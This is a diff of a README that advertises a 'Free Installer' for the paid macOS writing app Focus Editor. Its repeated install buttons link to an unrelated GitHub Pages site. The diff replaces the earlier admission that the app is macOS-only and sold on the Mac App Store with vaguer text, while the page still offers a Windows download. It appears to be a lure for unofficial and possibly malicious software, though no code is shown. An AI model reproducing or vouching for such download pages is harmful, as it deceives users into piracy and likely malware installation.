@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Writing+Editor-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Focus Editor Free Installer** — Focus Editor is a distraction-free writing application for macOS with Markdown support, a beautiful full-screen mode, and typewriter scrolling. Works without internet access, no account required. Full offline installation.
+**💻 Focus Editor Free Installer** — Focus Editor is a distraction-free writing and coding application designed to help writers and developers enter a flow state. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Focus Editor](https://img.shields.io/badge/⬇_Install_Focus%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Focus Editor](https://img.shields.io/badge/⬇_Install_Focus+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Focus Editor
 
-Focus Editor is a distraction-free writing application for macOS with Markdown support, a beautiful full-screen mode, and typewriter scrolling. It keeps the current writing position centered on screen to maintain a natural writing flow.
+Focus Editor is a distraction-free writing and coding application designed to help writers and developers enter a flow state. With a minimal, full-screen interface, customizable color themes, Markdown support, and code syntax highlighting, Focus Editor strips away interface clutter so you can concentrate on your words or code without interruption.
 
 ---
 
 ## ❌ Problem: Focus Editor is hard to access
 
-- **macOS Only** — No Windows or Linux version
-- **Basic Feature Set** — Minimal toolset; suited for drafting, not complex document management
-- **Competition** — iA Writer and Ulysses offer more features for the same or similar price
-- **Paid App** — Requires purchase from Mac App Store
+- **Limited Features** — Minimalism means missing some power-user editing features
+- **Platform Availability** — Available on select platforms
+- **No Extensions** — Cannot be extended with plugins
+- **Export Options** — Limited export format support compared to full-featured editors
 
 ---
 
@@ -81,7 +81,7 @@ Focus Editor is a distraction-free writing application for macOS with Markdown s
 
 <div align="center">
 
-[![⬇ Install Focus Editor](https://img.shields.io/badge/⬇_Install_Focus%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Focus Editor](https://img.shields.io/badge/⬇_Install_Focus+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Focus Editor is a distraction-free writing application for macOS with Markdown s
 
 ---
 
-**Focus Editor Free Installer** — Focus Editor is a distraction-free writing application for macOS with Markdown support, a beautiful full-screen mode, and typewriter scrolling. Install without internet connection today!
+**Focus Editor Free Installer** — Focus Editor is a distraction-free writing and coding application designed to help writers and developers enter a flow state. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Focus Editor](https://img.shields.io/badge/⬇_Install_Focus%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Focus Editor](https://img.shields.io/badge/⬇_Install_Focus+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
